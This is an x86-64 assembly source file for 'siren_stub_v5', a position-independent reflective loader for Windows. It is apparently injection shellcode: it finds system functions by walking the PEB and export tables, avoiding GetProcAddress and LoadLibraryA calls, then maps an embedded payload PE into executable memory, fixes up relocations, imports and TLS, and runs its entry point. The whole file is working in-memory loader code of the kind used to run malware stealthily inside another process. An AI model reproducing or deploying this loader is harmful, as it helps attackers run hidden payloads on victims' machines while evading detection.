/*
 * siren_stub_v5.S - Fully self-contained PIC reflective loader
 * ALL resolution via PEB walk + export table walk. Zero calls to
 * LoadLibraryA, GetProcAddress, or TlsAlloc.
 */
    .intel_syntax noprefix
    .text
    .align 16
    .global SirenStubEntry

SirenStubEntry:
    endbr64
    lea  r10, [rip + .Lonce_flag]
    mov  eax, 1
    lock xchg dword ptr [r10], eax
    test eax, eax
    jnz  .Lexit_clean

    push rbp
    mov  rbp, rsp
    sub  rsp, 0x100
    and  rsp, -16
    mov  [rbp-0x08], rbx
    mov  [rbp-0x10], r12
    mov  [rbp-0x18], r13
    mov  [rbp-0x20], r14
    mov  [rbp-0x28], r15
    mov  [rbp-0x30], rsi
    mov  [rbp-0x38], rdi

    /* S1 PEB WALK — scan InLoadOrder for first module with native VirtualAlloc.
       On Win10+ kernel32 exports VirtualAlloc as a PE forwarder to kernelbase,
       so export_lookup (which rejects forwarders) would return 0. Scanning finds
       kernelbase.dll automatically without hardcoding any position. */
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x18]
    mov  [rbp-0x68], rax
    lea  rdi, [rax + 0x10]        /* rdi = &Ldr->InLoadOrderModuleList (head) */
    mov  r12, [rdi]               /* r12 = first module (InLoadOrderLinks at entry+0) */
.Lfind_apibase:
    cmp  r12, rdi
    jz   .Ldone                   /* full loop, no module found */
    mov  rax, [r12 + 0x30]       /* DllBase */
    test rax, rax
    jz   .Lfind_apibase_next
    mov  [rbp-0x60], rax
    mov  rcx, rax
    lea  rdx, [rip + .Lstr_VirtualAlloc]
    call .Lexport_lookup
    test rax, rax
    jnz  .Lfind_apibase_done
.Lfind_apibase_next:
    mov  r12, [r12]               /* InLoadOrderLinks.Flink */
    jmp  .Lfind_apibase
.Lfind_apibase_done:
    mov  r12, [rbp-0x60]         /* r12 = DllBase (kernelbase or kernel32) */
    mov  [rbp-0x40], rax         /* VirtualAlloc */

    /* S2 RESOLVE FlushIC + LoadLibraryA from same module */
    mov  rcx, r12
    lea  rdx, [rip + .Lstr_FlushIC]
    call .Lexport_lookup
    test rax, rax
    jz   .Ldone
    mov  [rbp-0x48], rax
    mov  rcx, r12
    lea  rdx, [rip + .Lstr_LoadLibraryA]
    call .Lexport_lookup
    mov  [rbp-0x50], rax

    /* S3 LOCATE PAYLOAD PE */
    lea  r12, [rip + SirenStubEntry]
    lea  rax, [rip + .Lpayload_offset]
    mov  eax, [rax]
    add  r12, rax
    cmp  word ptr [r12], 0x5A4D
    jne  .Ldone
    mov  eax, [r12 + 0x3C]
    lea  r13, [r12 + rax]
    cmp  dword ptr [r13], 0x4550
    jne  .Ldone

    /* S4 VirtualAlloc */
    sub  rsp, 0x20
    xor  ecx, ecx
    mov  edx, [r13 + 0x50]
    mov  r8d, 0x3000
    mov  r9d, 0x40
    call [rbp-0x40]
    add  rsp, 0x20
    test rax, rax
    jz   .Ldone
    mov  r14, rax
    mov  r15, r14
    sub  r15, [r13 + 0x30]

    /* S5 COPY HEADERS + SECTIONS */
    mov  ecx, [r13 + 0x54]
    mov  rdi, r14
    mov  rsi, r12
    rep  movsb
    movzx ebx, word ptr [r13 + 0x06]
    movzx eax, word ptr [r13 + 0x14]
    lea  rsi, [r13 + 0x18 + rax]
.Lsec_loop:
    test ebx, ebx
    jz   .Lsec_done
    mov  eax, [rsi + 0x10]
    test eax, eax
    jz   .Lsec_next
    push rbx
    push rsi
    # Cap copy at VirtualSize to prevent buffer overflow
    mov  ecx, [rsi + 0x08]
    test ecx, ecx
    jz   .Lsec_use_raw
    cmp  ecx, eax
    jae  .Lsec_use_raw
    mov  eax, ecx
.Lsec_use_raw:
    mov  edx, [rsi + 0x0C]
    mov  ecx, [rsi + 0x14]
    lea  rdi, [r14 + rdx]
    lea  rsi, [r12 + rcx]
    mov  ecx, eax
    rep  movsb
    pop  rsi
    pop  rbx
.Lsec_next:
    add  rsi, 40
    dec  ebx
    jmp  .Lsec_loop
.Lsec_done:

    /* S6 RELOCATIONS */
    test r15, r15
    jz   .Lreloc_done
    mov  eax, [r13 + 0xB0]
    test eax, eax
    jz   .Lreloc_done
    mov  ecx, [r13 + 0xB4]
    test ecx, ecx
    jz   .Lreloc_done
    lea  rsi, [r14 + rax]
    lea  rbx, [rsi + rcx]
.Lreloc_blk:
    cmp  rsi, rbx
    jae  .Lreloc_done
    mov  r8d, [rsi + 4]
    cmp  r8d, 8
    jb   .Lreloc_done
    mov  ecx, r8d
    sub  ecx, 8
    shr  ecx, 1
    mov  edx, [rsi]
    lea  r10, [rsi + 8]
.Lreloc_ent:
    test ecx, ecx
    jz   .Lreloc_next
    movzx eax, word ptr [r10]
    mov  r11d, eax
    shr  r11d, 12
    and  eax, 0xFFF
    cmp  r11d, 10
    jne  .Lreloc_skip
    lea  r11, [r14 + rdx]
    add  r11, rax
    add  [r11], r15
.Lreloc_skip:
    add  r10, 2
    dec  ecx
    jmp  .Lreloc_ent
.Lreloc_next:
    add  rsi, r8
    jmp  .Lreloc_blk
.Lreloc_done:

    /* S6.5 EXCEPTION DIRECTORY — register .pdata via RtlAddFunctionTable.
       Without this, any exception in the payload causes a process crash
       because the OS has no RUNTIME_FUNCTION table for unwind.
       NOTE: must use [rbp-0x60] (saved API module DllBase), NOT r12
       (which was overwritten in S3 with the source PE base). */
    mov  rcx, [rbp-0x60]
    lea  rdx, [rip + .Lstr_RtlAddFuncTable]
    call .Lexport_lookup
    test rax, rax
    jz   .Lexc_done
    mov  [rbp-0x58], rax         /* RtlAddFunctionTable */

    /* DataDirectory[3] = Exception Directory.
       From NT headers: OptHdr + 0x88 = DataDirectory[3] (offset 0xA0 from r13). */
    mov  eax, [r13 + 0xA0]       /* ExceptionDir RVA */
    test eax, eax
    jz   .Lexc_done
    mov  ecx, [r13 + 0xA4]       /* ExceptionDir Size */
    cmp  ecx, 12                  /* sizeof(RUNTIME_FUNCTION) = 12 */
    jb   .Lexc_done

    /* EntryCount = Size / 12 */
    mov  eax, ecx
    xor  edx, edx
    mov  ecx, 12
    div  ecx                     /* eax = EntryCount */
    test eax, eax
    jz   .Lexc_done
    mov  r9d, eax                /* r9d = count (save) */

    /* RtlAddFunctionTable(FunctionTable, EntryCount, BaseAddress) */
    mov  eax, [r13 + 0xA0]       /* ExceptionDir RVA again */
    lea  rcx, [r14 + rax]        /* 1st arg: table VA in loaded image */
    mov  edx, r9d                /* 2nd arg: entry count */
    mov  r8, r14                 /* 3rd arg: image base */
    sub  rsp, 0x20
    call [rbp-0x58]
    add  rsp, 0x20
.Lexc_done:

    /* S7 IMPORTS — skip if injector pre-resolved all IAT entries
       OptHdr DataDirectory[1] = Import Directory:
         +0x90 = ImportDir.VirtualAddress */
    lea  r10, [rip + .Lskip_imports]
    cmp  byte ptr [r10], 0
    jne  .Limp_done
    mov  eax, [r13 + 0x90]            /* ImportDir RVA */
    test eax, eax
    jz   .Limp_done
    lea  rsi, [r14 + rax]             /* rsi = first IMPORT_DESCRIPTOR */
.Limp_desc:
    mov  eax, [rsi + 0x0C]
    test eax, eax
    jz   .Limp_done
    lea  rbx, [r14 + rax]
    mov  rax, [rbp-0x68]
    lea  rdi, [rax + 0x10]
    mov  rax, [rdi]
.Lpeb_walk:
    cmp  rax, rdi
    je   .Limp_try_loadlib
    movzx ecx, word ptr [rax + 0x58]
    shr  ecx, 1
    test ecx, ecx
    jz   .Lpeb_next
    mov  r11, [rax + 0x60]
    test r11, r11
    jz   .Lpeb_next
    mov  [rbp-0x70], rax
    push rsi
    push rdi
    mov  rsi, rbx
    xor  edx, edx
.Lcmp_name:
    movzx r8d, byte ptr [rsi + rdx]
    cmp  edx, ecx
    jae  .Lcmp_check_end
    movzx r9d, word ptr [r11 + rdx*2]
    cmp  r8d, 0x41
    jb   .Lcmp_nl1
    cmp  r8d, 0x5A
    ja   .Lcmp_nl1
    or   r8d, 0x20
.Lcmp_nl1:
    cmp  r9d, 0x41
    jb   .Lcmp_nl2
    cmp  r9d, 0x5A
    ja   .Lcmp_nl2
    or   r9d, 0x20
.Lcmp_nl2:
    cmp  r8d, r9d
    jne  .Lcmp_fail
    test r8d, r8d
    jz   .Lcmp_match
    inc  edx
    jmp  .Lcmp_name
.Lcmp_check_end:
    test r8d, r8d
    jz   .Lcmp_match
.Lcmp_fail:
    pop  rdi
    pop  rsi
    mov  rax, [rbp-0x70]
.Lpeb_next:
    mov  rax, [rax]
    jmp  .Lpeb_walk
.Lcmp_match:
    pop  rdi
    pop  rsi
    mov  rax, [rbp-0x70]
    mov  r8, [rax + 0x30]
    test r8, r8
    jz   .Limp_skip
.Limp_do_thunks:
    mov  eax, [rsi]
    test eax, eax
    jnz  .Limp_has_ilt
    mov  eax, [rsi + 0x10]
.Limp_has_ilt:
    lea  rdi, [r14 + rax]
    mov  eax, [rsi + 0x10]
    lea  r12, [r14 + rax]
.Limp_thunk:
    mov  rax, [rdi]
    test rax, rax
    jz   .Limp_skip
    bt   rax, 63
    jb   .Limp_ordinal
    lea  rdx, [r14 + rax + 2]
    jmp  .Limp_do_resolve
.Limp_ordinal:
    xor  eax, eax
    mov  [r12], rax
    add  rdi, 8
    add  r12, 8
    jmp  .Limp_thunk
.Limp_do_resolve:
    mov  [rbp-0x78], rsi
    mov  [rbp-0x80], rdi
    mov  [rbp-0x88], r8
    mov  [rbp-0x90], r12
    mov  rcx, r8
    call .Lexport_lookup
    mov  rsi, [rbp-0x78]
    mov  rdi, [rbp-0x80]
    mov  r8,  [rbp-0x88]
    mov  r12, [rbp-0x90]
    mov  [r12], rax
    add  rdi, 8
    add  r12, 8
    jmp  .Limp_thunk
.Limp_try_loadlib:
    mov  rax, [rbp-0x50]
    test rax, rax
    jz   .Limp_skip
    push rsi
    push rdi
    sub  rsp, 0x20
    mov  rcx, rbx
    call rax
    add  rsp, 0x20
    pop  rdi
    pop  rsi
    test rax, rax
    jz   .Limp_skip
    mov  r8, rax
    jmp  .Limp_do_thunks
.Limp_skip:
    add  rsi, 20
    jmp  .Limp_desc
.Limp_done:

    /* S8 TLS — manual via PEB TlsBitmap */
    mov  eax, [r13 + 0xD0]
    test eax, eax
    jz   .Ltls_done
    mov  ecx, [r13 + 0xD4]
    cmp  ecx, 0x28
    jb   .Ltls_done
    lea  rbx, [r14 + rax]
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x78]
    test rax, rax
    jz   .Ltls_done
    mov  ecx, [rax]
    mov  rax, [rax + 0x08]
    test rax, rax
    jz   .Ltls_done
    test ecx, ecx
    jz   .Ltls_done
    mov  [rbp-0x70], rax
    shr  ecx, 5
    test ecx, ecx
    jz   .Ltls_done
    xor  edx, edx
.Ltls_scan:
    cmp  edx, ecx
    jae  .Ltls_done
    mov  r8d, [rax + rdx*4]
    cmp  r8d, -1
    jne  .Ltls_found
    inc  edx
    jmp  .Ltls_scan
.Ltls_found:
    not  r8d
    bsf  r9d, r8d
    mov  r12d, edx
    shl  r12d, 5
    add  r12d, r9d
    mov  rax, [rbp-0x70]
    lock bts dword ptr [rax + rdx*4], r9d
    mov  rcx, [rbx + 0x10]
    test rcx, rcx
    jz   .Ltls_alloc_data
    mov  [rcx], r12d
.Ltls_alloc_data:
    xor  eax, eax
    mov  [rbp-0x90], rax
    mov  rdi, [rbx + 0x00]
    mov  rsi, [rbx + 0x08]
    test rdi, rdi
    jz   .Ltls_setval
    test rsi, rsi
    jz   .Ltls_setval
    cmp  rsi, rdi
    jbe  .Ltls_setval
    mov  rcx, rsi
    sub  rcx, rdi
    mov  edx, [rbx + 0x20]
    add  rcx, rdx
    test rcx, rcx
    jz   .Ltls_setval
    mov  [rbp-0x78], rcx
    mov  [rbp-0x80], rdi
    mov  rax, rsi
    sub  rax, rdi
    mov  [rbp-0x88], rax
    sub  rsp, 0x20
    xor  ecx, ecx
    mov  edx, [rbp-0x78]
    mov  r8d, 0x3000
    mov  r9d, 0x04
    call [rbp-0x40]
    add  rsp, 0x20
    test rax, rax
    jz   .Ltls_setval
    mov  [rbp-0x90], rax
    mov  rdi, rax
    mov  rsi, [rbp-0x80]
    mov  rcx, [rbp-0x88]
    rep  movsb
.Ltls_setval:
    mov  rax, gs:[0x58]
    test rax, rax
    jz   .Ltls_callbacks
    mov  rcx, [rbp-0x90]
    test rcx, rcx
    jz   .Ltls_callbacks
    mov  [rax + r12*8], rcx
.Ltls_callbacks:
    mov  rax, [rbx + 0x18]
    test rax, rax
    jz   .Ltls_done
.Ltls_cb_loop:
    mov  r10, [rax]
    test r10, r10
    jz   .Ltls_cb_done
    mov  [rbp-0x78], rax
    sub  rsp, 0x20
    mov  rcx, r14
    mov  edx, 1
    xor  r8, r8
    call r10
    add  rsp, 0x20
    mov  rax, [rbp-0x78]
    add  rax, 8
    jmp  .Ltls_cb_loop
.Ltls_cb_done:
.Ltls_done:

    /* S9 FLUSH + DllMain */
    sub  rsp, 0x20
    mov  rcx, -1
    mov  rdx, r14
    mov  r8d, [r13 + 0x50]
    call [rbp-0x48]
    add  rsp, 0x20
    mov  eax, [r13 + 0x28]
    test eax, eax
    jz   .Ldone
    sub  rsp, 0x20
    lea  rax, [r14 + rax]
    mov  rcx, r14
    mov  edx, 1
    xor  r8, r8
    call rax
    add  rsp, 0x20

.Ldone:
    mov  rbx, [rbp-0x08]
    mov  r12, [rbp-0x10]
    mov  r13, [rbp-0x18]
    mov  r14, [rbp-0x20]
    mov  r15, [rbp-0x28]
    mov  rsi, [rbp-0x30]
    mov  rdi, [rbp-0x38]
    mov  rsp, rbp
    pop  rbp
.Lexit_clean:
    xor  eax, eax
    ret

/* Internal: export walker. rcx=base rdx=name -> rax=VA or 0 */
.Lexport_lookup:
    push rbx
    push rsi
    push rdi
    mov  rbx, rcx
    mov  rsi, rdx
    mov  eax, [rbx + 0x3C]
    lea  rax, [rbx + rax]
    mov  eax, [rax + 0x88]
    test eax, eax
    jz   .Lexp_nf
    lea  rax, [rbx + rax]
    mov  ecx, [rax + 0x18]
    test ecx, ecx
    jz   .Lexp_nf
    mov  r8d, [rax + 0x20]
    lea  r8, [rbx + r8]
    mov  r9d, [rax + 0x24]
    lea  r9, [rbx + r9]
    mov  r10d, [rax + 0x1C]
    lea  r10, [rbx + r10]
    xor  edx, edx
.Lexp_scan:
    cmp  edx, ecx
    jae  .Lexp_nf
    mov  eax, [r8 + rdx*4]
    lea  rdi, [rbx + rax]
    xor  r11d, r11d
.Lexp_cmp:
    mov  al, [rdi + r11]
    cmp  al, [rsi + r11]
    jne  .Lexp_next
    test al, al
    jz   .Lexp_found
    inc  r11d
    jmp  .Lexp_cmp
.Lexp_next:
    inc  edx
    jmp  .Lexp_scan
.Lexp_found:
    movzx eax, word ptr [r9 + rdx*2]
    mov  eax, [r10 + rax*4]
    /* Reject forwarders: RVA inside export directory range */
    mov  ecx, [rbx + 0x3C]
    lea  rcx, [rbx + rcx]
    mov  edx, [rcx + 0x88]
    cmp  eax, edx
    jb   .Lexp_fwd_ok
    add  edx, [rcx + 0x8C]
    cmp  eax, edx
    jb   .Lexp_nf
.Lexp_fwd_ok:
    lea  rax, [rbx + rax]
    pop  rdi
    pop  rsi
    pop  rbx
    ret
.Lexp_nf:
    xor  eax, eax
    pop  rdi
    pop  rsi
    pop  rbx
    ret

    .align 8
.Lonce_flag:
    .long 0
.Lprogress:
    .long 0
.Lskip_imports:
    .byte 0
    .align 4
.Lpayload_offset:
    .long 0
    .long 0
.Lstr_VirtualAlloc:
    .asciz "VirtualAlloc"
.Lstr_FlushIC:
    .asciz "FlushInstructionCache"
.Lstr_LoadLibraryA:
    .asciz "LoadLibraryA"
.Lstr_RtlAddFuncTable:
    .asciz "RtlAddFunctionTable"

    .align 16, 0x90
siren_stub_end:

    .align 8
    .global siren_stub_code
    .global siren_stub_code_size
    .global siren_stub_payload_offset_patch
    .global siren_stub_progress_offset
siren_stub_code:
    .quad 0
siren_stub_code_size:
    .quad siren_stub_end - SirenStubEntry
siren_stub_payload_offset_patch:
    .quad .Lpayload_offset - SirenStubEntry
siren_stub_progress_offset:
    .quad .Lprogress - SirenStubEntry
